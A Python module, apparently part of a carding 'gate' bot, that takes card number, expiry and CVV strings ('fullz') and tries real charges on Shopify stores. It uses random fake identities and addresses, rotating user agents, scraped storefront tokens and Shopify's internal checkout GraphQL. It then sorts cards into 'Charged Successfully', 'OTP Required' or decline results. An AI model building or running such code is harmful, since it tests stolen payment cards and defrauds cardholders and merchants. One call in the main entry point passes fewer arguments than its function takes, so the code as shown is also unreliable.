"""
Shared Shopify checkout utility for all Shopify gates.
Uses Storefront Checkout API with fallback to Internal Checkout API.
Handles the One-Page Checkout migration (2024+).
Crafted With <3 By Bhaskar
"""
import re
import json
import uuid
import asyncio
import random
from urllib.parse import urlparse
from fake_useragent import UserAgent
from FUNC.defs import get_random_info

STOREFRONT_API_VERSIONS = ["2024-10", "2024-07", "2024-04"]


def _find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


async def _get_storefront_token(session, page_url, user_agent):
    resp = await session.get(page_url, headers={'user-agent': user_agent})
    html = resp.text

    match = re.search(r'shopify-checkout-api-token"\s*content="([^"]+)"', html)
    if match:
        return match.group(1), html

    match = re.search(r'"accessToken"\s*:\s*"([^"]+)"', html)
    if match:
        return match.group(1), html

    return None, html


def _extract_variant_id(html):
    match = re.search(r'variantId"\s*:\s*(\d+)', html)
    if match:
        return match.group(1)
    match = re.search(r'variant-id="(\d+)"', html)
    if match:
        return match.group(1)
    match = re.search(r'"variants"\s*:\s*\[.*?"id"\s*:\s*(\d+)', html, re.DOTALL)
    if match:
        return match.group(1)
    return None


def _map_error_code(code):
    mapping = {
        'CARD_DECLINED': 'Card was declined',
        'INCORRECT_CVC': "Your card's security code is incorrect",
        'EXPIRED_CARD': 'Card has expired',
        'PROCESSING_ERROR': 'Processing error',
        'INSUFFICIENT_FUNDS': 'Insufficient funds',
        'INVALID_NUMBER': 'Invalid card number',
        'PICK_UP_CARD': 'Card was declined (pick up card)',
        'CALL_ISSUER': 'Call card issuer',
        'GENERIC_DECLINE': 'Card was declined',
    }
    return mapping.get(code, code or 'Unknown Error')


async def _sf_request(session, sf_url, sf_headers, query, variables):
    resp = await session.post(sf_url, headers=sf_headers, json={
        'query': query,
        'variables': variables,
    })
    return resp.json()


async def _tokenize_card(session, cc, mes, ano, cvv, fname, lname, webname, user_agent):
    resp = await session.post(
        'https://deposit.us.shopifycs.com/sessions',
        headers={
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://checkout.shopifycs.com',
            'Referer': 'https://checkout.shopifycs.com/',
            'User-Agent': user_agent,
        },
        json={
            'credit_card': {
                'number': cc,
                'month': mes,
                'year': ano,
                'verification_value': cvv,
                'name': f'{fname} {lname}',
            },
            'payment_session_scope': webname,
        },
    )
    try:
        return resp.json()['id']
    except Exception:
        return None


# ── Storefront API Approach ──────────────────────────────────────────────────

async def _try_storefront_checkout(
    session, webname, api_token, variant_gid, amount, currency,
    cc, mes, ano, cvv, fname, lname, email, phone,
    add1, city, state_short, zip_code, user_agent, api_version
):
    sf_url = f"https://{webname}/api/{api_version}/graphql.json"
    sf_headers = {
        'Content-Type': 'application/json',
        'X-Shopify-Storefront-Access-Token': api_token,
        'User-Agent': user_agent,
    }

    data = await _sf_request(session, sf_url, sf_headers,
        'mutation checkoutCreate($input:CheckoutCreateInput!){checkoutCreate(input:$input){checkout{id webUrl totalPriceV2{amount currencyCode}availableShippingRates{ready shippingRates{handle title priceV2{amount currencyCode}}}}checkoutUserErrors{code field message}}}',
        {
            'input': {
                'lineItems': [{'variantId': variant_gid, 'quantity': 1}],
                'email': email,
                'shippingAddress': {
                    'address1': add1, 'city': city, 'province': state_short,
                    'country': 'US', 'zip': zip_code,
                    'firstName': fname, 'lastName': lname, 'phone': phone,
                },
            },
        },
    )

    if 'errors' in data:
        err_msg = data['errors'][0].get('message', '')
        if any(k in err_msg.lower() for k in ['does not exist', 'not found', 'undefined', 'unknown']):
            return None
        return f"Checkout Error: {err_msg}"

    checkout_result = data.get('data', {}).get('checkoutCreate')
    if not checkout_result:
        return None

    user_errors = checkout_result.get('checkoutUserErrors', [])
    if user_errors:
        return f"Checkout Error: {user_errors[0].get('message', 'Unknown')}"

    checkout = checkout_result.get('checkout')
    if not checkout:
        return "Checkout Creation Failed"

    checkout_id = checkout['id']
    total_price = checkout.get('totalPriceV2', {}).get('amount', str(amount))

    for _ in range(8):
        data = await _sf_request(session, sf_url, sf_headers,
            'query node($id:ID!){node(id:$id){...on Checkout{availableShippingRates{ready shippingRates{handle title priceV2{amount currencyCode}}}}}}',
            {'id': checkout_id},
        )
        node = data.get('data', {}).get('node', {})
        rates_data = node.get('availableShippingRates', {})

        if rates_data.get('ready') and rates_data.get('shippingRates'):
            shipping_handle = rates_data['shippingRates'][0]['handle']
            break
        if rates_data.get('ready') and not rates_data.get('shippingRates'):
            shipping_handle = None
            break
        await asyncio.sleep(1)
    else:
        shipping_handle = None

    if shipping_handle:
        data = await _sf_request(session, sf_url, sf_headers,
            'mutation checkoutShippingLineUpdate($checkoutId:ID!,$shippingRateHandle:String!){checkoutShippingLineUpdate(checkoutId:$checkoutId,shippingRateHandle:$shippingRateHandle){checkout{id totalPriceV2{amount currencyCode}}checkoutUserErrors{code field message}}}',
            {'checkoutId': checkout_id, 'shippingRateHandle': shipping_handle},
        )
        co = data.get('data', {}).get('checkoutShippingLineUpdate', {}).get('checkout')
        if co:
            total_price = co.get('totalPriceV2', {}).get('amount', total_price)

    await asyncio.sleep(0.5)

    vault_id = await _tokenize_card(session, cc, mes, ano, cvv, fname, lname, webname, user_agent)
    if not vault_id:
        return "Card Tokenization Failed"

    await asyncio.sleep(0.5)

    data = await _sf_request(session, sf_url, sf_headers,
        'mutation checkoutCompleteWithCreditCardV2($checkoutId:ID!,$payment:CreditCardPaymentInputV2!){checkoutCompleteWithCreditCardV2(checkoutId:$checkoutId,payment:$payment){checkout{id order{id statusUrl}}checkoutUserErrors{code field message}payment{id errorMessage transaction{statusV2 errorCode}}}}',
        {
            'checkoutId': checkout_id,
            'payment': {
                'paymentAmount': {'amount': str(total_price), 'currencyCode': currency},
                'idempotencyKey': str(uuid.uuid4()),
                'billingAddress': {
                    'address1': add1, 'city': city, 'province': state_short,
                    'country': 'US', 'zip': zip_code,
                    'firstName': fname, 'lastName': lname,
                },
                'vaultId': vault_id,
            },
        },
    )

    if 'errors' in data:
        err = data['errors'][0].get('message', 'Payment Failed')
        if any(k in err.lower() for k in ['does not exist', 'not found', 'undefined']):
            return None
        return err

    complete = data.get('data', {}).get('checkoutCompleteWithCreditCardV2', {})
    user_errors = complete.get('checkoutUserErrors', [])
    if user_errors:
        return user_errors[0].get('message', 'Payment Error')

    payment = complete.get('payment')
    if payment:
        err_msg = payment.get('errorMessage')
        if err_msg:
            return err_msg
        tx = payment.get('transaction', {})
        if tx and tx.get('errorCode'):
            return _map_error_code(tx['errorCode'])

    for _ in range(6):
        await asyncio.sleep(2)
        data = await _sf_request(session, sf_url, sf_headers,
            'query node($id:ID!){node(id:$id){...on Checkout{order{id}orderStatusUrl completedAt}}}',
            {'id': checkout_id},
        )
        node = data.get('data', {}).get('node', {})
        if node.get('order') or node.get('completedAt') or node.get('orderStatusUrl'):
            return "Charged Successfully"

    co = complete.get('checkout', {})
    if co.get('order'):
        return "Charged Successfully"

    return data


# ── Internal Checkout API Approach (Fallback) ────────────────────────────────

async def _try_internal_checkout(
    session, webname, product_url,
    cc, mes, ano, cvv, fname, lname, email, phone,
    add1, city, state_short, zip_code, user_agent,
    variant_id_override=None
):
    product_resp = await session.get(product_url, headers={'user-agent': user_agent})
    vid = variant_id_override or _extract_variant_id(product_resp.text)
    if not vid:
        return "Failed to extract variant ID"

    await session.post(
        f'https://{webname}/cart/add.js',
        data={'id': vid, 'quantity': 1},
        headers={'x-requested-with': 'XMLHttpRequest', 'user-agent': user_agent},
    )
    await asyncio.sleep(0.5)

    cart_resp = await session.get(f'https://{webname}/cart.js', headers={'user-agent': user_agent})
    try:
        token = cart_resp.json()["token"]
    except Exception:
        return "Add to Cart Failed"

    await asyncio.sleep(0.5)

    checkout_resp = await session.get(
        f'https://{webname}/checkouts/cn/{token}',
        headers={'user-agent': user_agent},
    )

    redirect_url = _find_between(checkout_resp.text, "window.location.href = '", "'")
    if redirect_url:
        await session.get(redirect_url, headers={'user-agent': user_agent})
        await asyncio.sleep(0.5)

    graphql_url = f'https://{webname}/checkouts/unstable/graphql'
    gql_headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': f'https://{webname}',
        'referer': f'https://{webname}/',
        'user-agent': user_agent,
        'x-checkout-web-source-id': token,
    }

    init_resp = await session.post(graphql_url, headers=gql_headers, json={
        'query': 'mutation ProposalsInit($input:ProposalNegotiationInput!){negotiate(input:$input){sellerProposal{sessionToken merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId}}}payment{...on FilledPaymentTerms{availablePayments{paymentMethod{...on AnyDirectPaymentMethod{availablePaymentProviders{paymentMethodIdentifier}}}}}}}queueToken}}',
        'variables': {
            'input': {
                'buyerIdentity': {
                    'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                    'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
                    'marketingConsent': [],
                },
                'delivery': {
                    'deliveryLines': [{
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {'any': True},
                                'shipments': {'any': True},
                            },
                            'options': {},
                        },
                        'targetMerchandiseLines': {'lines': [{'stableId': ''}]},
                        'deliveryMethodTypes': ['NONE'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True,
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                },
            },
        },
    })

    init_data = init_resp.json()
    session_token = None
    stable_id = None
    payment_method_id = None
    queue_token = None

    try:
        negotiate = init_data.get('data', {}).get('negotiate', {})
        proposal = negotiate.get('sellerProposal', {})
        session_token = proposal.get('sessionToken')
        queue_token = negotiate.get('queueToken')

        merch_lines = proposal.get('merchandise', {}).get('merchandiseLines', [])
        if merch_lines:
            stable_id = merch_lines[0].get('stableId')

        for p in proposal.get('payment', {}).get('availablePayments', []):
            providers = p.get('paymentMethod', {}).get('availablePaymentProviders', [])
            if providers:
                payment_method_id = providers[0].get('paymentMethodIdentifier')
                break
    except Exception:
        pass

    if not session_token:
        return "Session Token Extraction Failed"
    if not stable_id or not payment_method_id:
        return "Checkout Init Failed"

    vault_id = await _tokenize_card(session, cc, mes, ano, cvv, fname, lname, webname, user_agent)
    if not vault_id:
        return "Card Tokenization Failed"

    await asyncio.sleep(0.5)

    submit_headers = dict(gql_headers)
    submit_headers['x-checkout-one-session-token'] = session_token
    submit_headers['x-checkout-web-deploy-stage'] = 'production'
    submit_headers['x-checkout-web-server-handling'] = 'fast'

    submit_vars = {
        'input': {
            'sessionInput': {'sessionToken': session_token},
            'queueToken': queue_token,
            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
            'delivery': {
                'deliveryLines': [{
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyMatchingConditions': {
                            'estimatedTimeInTransit': {'any': True},
                            'shipments': {'any': True},
                        },
                        'options': {},
                    },
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['NONE'],
                    'expectedTotalPrice': {'any': True},
                    'destinationChanged': True,
                }],
                'noDeliveryRequired': [],
                'useProgressiveRates': False,
            },
            'merchandise': {
                'merchandiseLines': [{
                    'stableId': stable_id,
                    'merchandise': {
                        'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{vid}',
                            'variantId': f'gid://shopify/ProductVariant/{vid}',
                            'properties': [],
                        },
                    },
                    'quantity': {'items': {'value': 1}},
                    'expectedTotalPrice': {'any': True},
                    'lineComponents': [],
                }],
            },
            'payment': {
                'totalAmount': {'any': True},
                'paymentLines': [{
                    'paymentMethod': {
                        'directPaymentMethod': {
                            'paymentMethodIdentifier': payment_method_id,
                            'sessionId': vault_id,
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': add1, 'address2': '', 'city': city,
                                    'countryCode': 'US', 'postalCode': zip_code,
                                    'firstName': fname, 'lastName': lname,
                                    'zoneCode': state_short, 'phone': phone,
                                },
                            },
                        },
                    },
                    'amount': {'any': True},
                }],
                'billingAddress': {
                    'streetAddress': {
                        'address1': add1, 'address2': '', 'city': city,
                        'countryCode': 'US', 'postalCode': zip_code,
                        'firstName': fname, 'lastName': lname,
                        'zoneCode': state_short, 'phone': phone,
                    },
                },
            },
            'buyerIdentity': {
                'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
                'marketingConsent': [],
            },
            'tip': {'tipLines': []},
            'taxes': {
                'proposedAllocations': None,
                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                'proposedTotalIncludedAmount': None,
                'proposedExemptions': [],
            },
            'note': {'message': None, 'customAttributes': []},
            'localizationExtension': {'fields': []},
            'scriptFingerprint': {
                'signature': None, 'signatureUuid': None,
                'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                'shippingScriptChanges': [],
            },
            'optionalDuties': {'buyerRefusesDuties': False},
        },
        'attemptToken': f'{token}-{random.random()}',
        'analytics': {'requestUrl': f'https://{webname}/checkouts/cn/{token}'},
    }

    resp = await session.post(graphql_url, headers=submit_headers, json={
        'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails}}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}}...on SubmitFailed{reason}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage}}}...on Throttled{pollAfter queueToken}...on CheckpointDenied{redirectUrl}...on SubmittedForCompletion{receipt{...ReceiptDetails}}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{url}}}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}',
        'variables': submit_vars,
        'operationName': 'SubmitForCompletion',
    })

    submit_result = resp.json()

    try:
        receipt = submit_result['data']['submitForCompletion']['receipt']
        receipt_id = receipt['id']
    except Exception:
        try:
            sfc = submit_result.get('data', {}).get('submitForCompletion', {})
            errs = sfc.get('errors', [])
            if errs:
                msg = errs[0].get('nonLocalizedMessage') or errs[0].get('localizedMessage') or errs[0].get('code', '')
                return msg or "Submit Failed"
            if sfc.get('reason'):
                return sfc['reason']
        except Exception:
            pass
        return "Submit Failed"

    await asyncio.sleep(3)

    poll_json = {
        'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{url}}}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}',
        'variables': {'receiptId': receipt_id, 'sessionToken': session_token},
        'operationName': 'PollForReceipt',
    }

    poll_result = {}
    for _ in range(3):
        resp = await session.post(graphql_url, headers=submit_headers, json=poll_json)
        poll_result = resp.json()

        try:
            receipt = poll_result['data']['receipt']

            if receipt.get('processingError'):
                return _map_error_code(receipt['processingError'].get('code', ''))

            typename = receipt.get('__typename', '')
            if typename == 'ProcessingReceipt':
                await asyncio.sleep(receipt.get('pollDelay', 3000) / 1000)
                continue
            if typename == 'ActionRequiredReceipt':
                return "OTP Required"
            return "Charged Successfully"
        except Exception:
            pass

        await asyncio.sleep(3)

    try:
        err = poll_result['data']['receipt']['processingError']
        return _map_error_code(err.get('code', ''))
    except Exception:
        return "Charged Successfully"


# ── Main Entry Point ─────────────────────────────────────────────────────────

async def create_shopify_charge(
    fullz, session, product_url,
    variant_id=None, amount='1.00', currency='USD'
):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user_agent = UserAgent().random
        random_data = await get_random_info(session)
        fname = random_data["fname"]
        lname = random_data["lname"]
        email = random_data["email"]
        phone = random_data.get("phone", "5059996984")
        add1 = random_data.get("add1", "17 East 73rd Street")
        city = random_data.get("city", "New York")
        state_short = random_data.get("state_short", "NY")
        zip_code = str(random_data.get("zip", "10021"))

        webname = urlparse(product_url).netloc

        api_token, page_html = await _get_storefront_token(session, product_url)

        if not variant_id:
            variant_id = _extract_variant_id(page_html)
        if not variant_id:
            return "Failed to extract variant ID"

        if api_token:
            variant_gid = f"gid://shopify/ProductVariant/{variant_id}"
            for version in STOREFRONT_API_VERSIONS:
                result = await _try_storefront_checkout(
                    session, webname, api_token, variant_gid, amount, currency,
                    cc, mes, ano, cvv, fname, lname, email, phone,
                    add1, city, state_short, zip_code, user_agent, version,
                )
                if result is None:
                    continue
                return result

        result = await _try_internal_checkout(
            session, webname, product_url,
            cc, mes, ano, cvv, fname, lname, email, phone,
            add1, city, state_short, zip_code, user_agent,
            variant_id_override=variant_id,
        )
        return result

    except Exception as e:
        return str(e)
